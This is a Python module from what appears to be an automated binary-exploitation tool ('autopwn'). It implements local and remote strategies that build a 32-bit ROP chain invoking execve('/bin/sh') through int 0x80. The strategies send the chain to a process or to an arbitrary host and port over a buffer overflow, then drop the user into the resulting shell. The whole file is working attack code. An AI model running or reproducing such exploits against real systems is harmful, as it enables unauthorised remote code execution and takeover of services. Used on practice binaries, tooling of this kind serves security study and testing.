"""P7.7: x32 execve syscall strategies (local + remote).

Replaces the v3.1 monolith's ``execve_syscall`` (L1869-1931, local)
+ ``execve_syscall_remote`` (L2139+, remote) ad-hoc functions
with two :class:`ExploitStrategy` subclasses.

Why execve syscall matters
---------------------------
* **No libc dependency**: the syscall convention is hard-coded
  by the kernel ABI (``eax=0xb`` for ``execve``, ``ebx``=path,
  ``ecx``=argv, ``edx``=envp).  Works when the binary is
  statically linked or stripped (no libc) — cases where
  P7.3 ret2system / P7.4-P7.5 ret2libc would fail.
* **No ``system`` symbol needed**: just 4 pop gadgets + 1
  ``int 0x80`` instruction.  ``ropper`` finds these in any
  glibc-linked binary with debug info.
* **x32 only**: 32-bit Linux uses ``int 0x80``; 64-bit uses
  the ``syscall`` instruction.  v3.1's execve branch
  (``_legacy.py`` L3466) only enters for ``bit_arch == 32``;
  P7.7 follows the same constraint.

Per ``rebuild.md`` §6.8 P7.7 + ``refactor.md`` §3.2.2 + P6.5
primitive contract.

Priority ``EXECVE_SYSCALL = 80`` per 附录 A.  Below rwx (90)
but above fmtstr (50).  Tried when all higher-priority
strategies have been filtered out (no PLT functions for
ret2libc, no system/binsh for ret2system, no RWX for shellcode).

The combined vs separate-gadget variant
---------------------------------------
P6.5's primitive auto-selects between two payload shapes
based on which gadgets ``ropper`` found:

* **Combined variant** (``pop_ecx == 0``, ``pop_ecx_ebx != 0``):
  one ``pop ecx; pop ebx`` gadget pops both registers.
  Payload: ``padding + 8 p32`` (32 bytes after padding).
* **Separate variant** (``pop_ecx != 0``):
  separate ``pop ecx; ret`` and ``pop ebx; ret`` gadgets.
  Payload: ``padding + 9 p32`` (36 bytes after padding).

The P7.7 strategy is agnostic to this — it just calls
``primitive.build_payload(ctx)`` and forwards the result.
"""
from __future__ import annotations

import datetime

from autopwn.context import ExploitContext
from autopwn.core.logging import print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.base import ExploitStrategy
from autopwn.exp.priorities import EXECVE_SYSCALL
from autopwn.exp.registry import register
from autopwn.primitives.execve_syscall import ExecveSyscallX32
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


# ---------------------------------------------------------------------------
# Local x32 strategy (x64 is intentionally absent — see module docstring)
# ---------------------------------------------------------------------------


@register
class ExecveSyscallX32LocalStrategy(ExploitStrategy):
    """Local 32-bit ``int 0x80; execve('/bin/sh', 0, 0)`` strategy.

    Metadata (``requires_*``):
      * ``arch = 32`` (only — x64 uses different syscall ABI;
        P7.3-P7.6 cover x64)
      * ``remote = False``
      * ``requires = ()`` (empty — no PLT/libc dependency; the
        only requirements are ROP gadgets in ``ctx.gadgets_x32``
        and a ``/bin/sh`` substring in the binary, both checked
        by the primitive at ``build_payload`` time and surfaced
        as ``b""`` on miss → strategy returns ``False``).

    Priority ``EXECVE_SYSCALL = 80`` per 附录 A.
    """
    name = "execve-syscall-x32"
    priority = EXECVE_SYSCALL
    requires_arch = 32
    requires_remote = False
    requires = ()

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit execve syscall locally.

        Defensive checks (return False on miss):
          * ``ctx.gadgets_x32 is None`` → no ROP gadgets
          * primitive returns ``b""`` → no ``/bin/sh`` or missing
            gadget (handled in primitive)
        """
        if ctx.gadgets_x32 is None:
            print_info("execve-syscall-x32: ctx.gadgets_x32 is None; skipping")
            return False

        print_section_header("EXPLOITATION: execve syscall - x32")
        print_payload("preparing execve syscall exploit")

        primitive = ExecveSyscallX32()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("execve-syscall-x32 primitive returned empty; skipping")
            return False

        from pwn import process
        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(payload)

        # Build addresses dict for the report.  Match v3.1's
        # ``handle_exploitation_success`` key set so the docx/md
        # output is byte-equivalent.
        addresses = {
            "pop_eax_addr": ctx.gadgets_x32.pop_eax,
            "pop_edx_addr": ctx.gadgets_x32.pop_edx,
            "int_0_80": ctx.gadgets_x32.int_0x80,
        }
        if ctx.gadgets_x32.pop_ecx == 0:
            # Combined variant
            exploit_type = "execve syscall - x32 (ecx_ebx)"
            addresses["pop_ecx_ebx_addr"] = ctx.gadgets_x32.pop_ecx_ebx
        else:
            # Separate variant
            exploit_type = "execve syscall - x32 (separate)"
            addresses["pop_ebx_addr"] = ctx.gadgets_x32.pop_ebx
            addresses["pop_ecx_addr"] = ctx.gadgets_x32.pop_ecx

        info = ExploitInfo(
            exploit_type=exploit_type,
            payload=payload,
            padding=ctx.padding,
            addresses=addresses,
            vulnerability_type="Buffer Overflow",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"ExecveSyscallX32LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


# ---------------------------------------------------------------------------
# Remote x32 strategy
# ---------------------------------------------------------------------------


@register
class ExecveSyscallX32RemoteStrategy(ExploitStrategy):
    """Remote 32-bit ``int 0x80; execve('/bin/sh', 0, 0)`` strategy.

    Mirror of :class:`ExecveSyscallX32LocalStrategy` for the
    ``ctx.mode == "remote"`` branch.  ``pwn.remote(host, port)``
    instead of ``pwn.process(path)``.  Per the appendix A
    note, execve_syscall is **x32 only** — there is no x64
    remote variant.
    """
    name = "execve-syscall-x32-remote"
    priority = EXECVE_SYSCALL
    requires_arch = 32
    requires_remote = True
    requires = ()

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit execve syscall against a remote service."""
        if ctx.remote is None:
            print_info("execve-syscall-x32-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        if ctx.gadgets_x32 is None:
            print_info("execve-syscall-x32-remote: ctx.gadgets_x32 is None; skipping")
            return False

        print_section_header("EXPLOITATION: execve syscall - x32 Remote")
        print_payload("preparing remote execve syscall exploit")

        primitive = ExecveSyscallX32()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("execve-syscall-x32-remote primitive returned empty; skipping")
            return False

        from pwn import remote
        io = remote(host, port)
        io.recv()
        io.sendline(payload)

        addresses = {
            "pop_eax_addr": ctx.gadgets_x32.pop_eax,
            "pop_edx_addr": ctx.gadgets_x32.pop_edx,
            "int_0_80": ctx.gadgets_x32.int_0x80,
        }
        if ctx.gadgets_x32.pop_ecx == 0:
            exploit_type = "execve syscall - x32 (ecx_ebx)"
            addresses["pop_ecx_ebx_addr"] = ctx.gadgets_x32.pop_ecx_ebx
        else:
            exploit_type = "execve syscall - x32 (separate)"
            addresses["pop_ebx_addr"] = ctx.gadgets_x32.pop_ebx
            addresses["pop_ecx_addr"] = ctx.gadgets_x32.pop_ecx

        info = ExploitInfo(
            exploit_type=exploit_type,
            payload=payload,
            padding=ctx.padding,
            addresses=addresses,
            vulnerability_type="Buffer Overflow",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"ExecveSyscallX32LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


__all__ = [
    "ExecveSyscallX32LocalStrategy",
    "ExecveSyscallX32RemoteStrategy",
]
